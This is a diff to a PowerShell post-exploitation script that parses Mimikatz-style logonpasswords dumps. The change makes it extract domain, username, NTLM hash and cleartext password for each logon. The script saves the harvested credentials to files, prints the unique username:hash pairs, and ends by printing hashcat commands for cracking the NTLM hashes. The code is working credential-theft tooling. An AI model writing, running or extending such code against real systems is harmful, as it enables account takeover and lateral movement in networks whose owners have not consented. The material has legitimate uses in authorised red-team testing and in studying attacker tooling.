@@ -3869,21 +3869,25 @@ foreach ($File in $Files){
     $Results = $LogonPasswordsOutput | Select-String "\[00000003\] Primary" -Context 0,4| ForEach-Object {
         $Output = $_.Context.PostContext
 
-        # Extract the values for Username, Domain, and NTLM
-        $Username = $output[0] -replace "^\s+\*\sUsername\s+:\s"
-        #$Domain = $output[1] -replace "^\s+\*\sDomain\s+:\s"
-        $NTLM = $output[2] -replace "^\s+\*\sNTLM\s+:\s"
+# Extract the values for Username, Domain, NTLM, and Password
+$Username = $output[0] -replace "^\s+\*\sUsername\s+:\s"
+$Domain = $output[1] -replace "^\s+\*\sDomain\s+:\s"
+$NTLM = $output[2] -replace "^\s+\*\sNTLM\s+:\s"
+# Trying to extract Password; if not existent, set to (null)
+$Password = if($output[3] -match "^\s+\*\sPassword\s+:\s") { $output[3] -replace "^\s+\*\sPassword\s+:\s" } else { "(null)" }
+
 
         # Create a new object with the extracted values
         [PSCustomObject]@{
-            Username = $Username
+            Username = "$Domain\$Username"
             NTLM = $NTLM
-            #Domain = $Domain
+            Password = $Password
+
         } 
     }
 
     # Sort the results by username and remove duplicates
-    $UniqueResults = $Results | Sort-Object -Property "Username" -Unique | Format-Table -Property Username, NTLM, Domain, Password -HideTableHeaders
+    $UniqueResults = $Results | Sort-Object -Property "Username" -Unique | Format-Table -Property Username, NTLM, Password -AutoSize
 
     if ($UniqueResults) {
         $FileToSplit = "$File.Name"
@@ -3892,7 +3896,7 @@ foreach ($File in $Files){
 
         # Format the output as a table and display it
         $FilePath = $LogonPasswordsOutputDirectory + "Hashes-" + "$File.Name" + ".txt"
-        $FormattedResults = $UniqueResults | Format-Table -AutoSize | Out-String -Width "1024"
+        $FormattedResults = $UniqueResults | Format-Table  -AutoSize | Out-String -Width "1024"
 
         # Remove empty lines from the formatted results
         $FilteredResults = $FormattedResults -split '\r?\n' | Where-Object { $_.Trim() -ne '' } | Out-String
@@ -3927,14 +3931,25 @@ $UpdatedlLines | Set-Content -Path "$LogonPasswords\.All-Unique-NTLM.txt"
 # Print unique NTLM hashes within the banner
 Write-Host
 Write-Host "-------------------------------------- All collected NTLM Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
-Get-Content  -path "$LogonPasswords\.All-Unique-NTLM.txt" | Sort-Object -Unique | Format-Table -AutoSize
-Write-Host
+# Extracting and printing USERNAME:NTLM pairs, assuming they are colon-separated and not headers
+Get-Content -Path "$LogonPasswords\.All-Unique-NTLM.txt" | 
+    Where-Object {$_ -notmatch "Username:NTLM:Password" -and $_ -match '^[^\:]+\:[a-fA-F0-9]{32}' } |
+    ForEach-Object {
+        $parts = $_ -split ":"
+        "$($parts[0]):$($parts[1])"
+    } | Sort-Object -Unique | ForEach-Object {
+        Write-Output "$_"
+    }
+
 Write-Host "----------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
 Write-Host 
 Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
 Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
 Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
 Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
+
+
+
     
     }
 }
